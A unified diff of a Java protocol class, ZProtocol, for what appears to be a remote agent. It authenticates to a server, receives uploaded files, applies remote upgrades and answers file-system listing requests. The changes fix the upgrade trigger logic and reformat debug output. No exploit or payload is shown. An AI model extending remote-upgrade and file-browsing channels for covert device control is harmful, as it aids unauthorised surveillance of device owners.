@@ -39,6 +39,9 @@ public class ZProtocol extends Protocol {
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
 
+    boolean upgrade;
+    Vector upgradeFiles = new Vector();
+
     public boolean perform() {
         //#ifdef DBC
         Check.requires(transport != null, "perform: transport = null");
@@ -101,17 +104,20 @@ public class ZProtocol extends Protocol {
                 debug.info("***** Upload *****");
                 //#endif  
 
+                upgrade = false;
                 boolean left = true;
                 while (left) {
                     response = command(Proto.UPLOAD);
                     left = parseUpload(response);
                 }
             }
-            
+
             if (capabilities[Proto.UPGRADE]) {
                 //#ifdef DEBUG
-                debug.info("***** Upload *****");
+                debug.info("***** Upgrade *****");
                 //#endif  
+
+                upgradeFiles.removeAllElements();
 
                 boolean left = true;
                 while (left) {
@@ -259,9 +265,7 @@ public class ZProtocol extends Protocol {
 
             // Retrieve Nonce and Cap
             byte[] cypherNonceCap = new byte[32];
-            Utils
-                    .copy(cypherNonceCap, 0, authResult, 32,
-                            cypherNonceCap.length);
+            Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);
 
             byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
             //#ifdef DEBUG
@@ -503,13 +507,21 @@ public class ZProtocol extends Protocol {
                 //#endif
                 Protocol.saveUpload(filename, content);
 
-                if(left==0){
-                    if (filename.equals(Protocol.UPGRADE_FILENAME_0)
-                            || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
-                        upgradeMulti();
-                    }
+                if (filename.equals(Protocol.UPGRADE_FILENAME_0)
+                        || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
+                    upgrade = true;
+                    //#ifdef DEBUG
+                    debug.trace("parseUpload: there's something to upgrade");
+                    //#endif
                 }
-                
+
+                if (left == 0 && upgrade) {
+                    //#ifdef DEBUG
+                    debug.trace("parseUpload: last file, go to upgrade");
+                    //#endif
+                    upgradeMulti();
+                }
+
                 return left > 0;
 
             } catch (EOFException e) {
@@ -530,8 +542,7 @@ public class ZProtocol extends Protocol {
             throw new ProtocolException();
         }
     }
-    
-    Vector upgradeFiles = new Vector();
+
     protected boolean parseUpgrade(byte[] result) throws ProtocolException {
 
         int res = Utils.byteArrayToInt(result, 0);
@@ -561,11 +572,14 @@ public class ZProtocol extends Protocol {
                 //#endif
                 Protocol.saveUpload(filename, content);
                 upgradeFiles.addElement(filename);
-                
-                if(left==0){
+
+                if (left == 0) {
+                    //#ifdef DEBUG
+                    debug.trace("parseUpgrade: all file saved, proceed with upgrade");
+                    //#endif
                     Protocol.upgradeMulti(upgradeFiles);
                 }
-                
+
                 return left > 0;
 
             } catch (EOFException e) {
@@ -602,9 +616,7 @@ public class ZProtocol extends Protocol {
                     int depth = dataBuffer.readInt();
                     String file = WChar.readPascal(dataBuffer);
                     //#ifdef DEBUG
-                    debug
-                            .trace("parseFileSystem: " + file + " depth: "
-                                    + depth);
+                    debug.trace("parseFileSystem: " + file + " depth: " + depth);
                     //#endif
 
                     // expanding $dir$
@@ -752,20 +764,21 @@ public class ZProtocol extends Protocol {
         byte[] plainIn = cryptoK.decryptData(cypherIn);
         return plainIn;
     }
+
     //#endif
 
     private byte[] cypheredWriteReadSha(byte[] plainOut)
             throws TransportException, CryptoException {
         //#ifdef DEBUG
         debug.trace("cypheredWriteReadSha");
-        debug.trace("plainout: "+plainOut.length);
+        debug.trace("plainout: " + plainOut.length);
         //#endif
 
         byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
         //#ifdef DEBUG        
-        debug.trace("cypherOut: "+cypherOut.length);
+        debug.trace("cypherOut: " + cypherOut.length);
         //#endif
-        
+
         byte[] cypherIn = transport.command(cypherOut);
 
         if (cypherIn.length < SHA1LEN) {
@@ -777,7 +790,7 @@ public class ZProtocol extends Protocol {
 
         byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);
 
-       return plainIn;
+        return plainIn;
 
     }
 
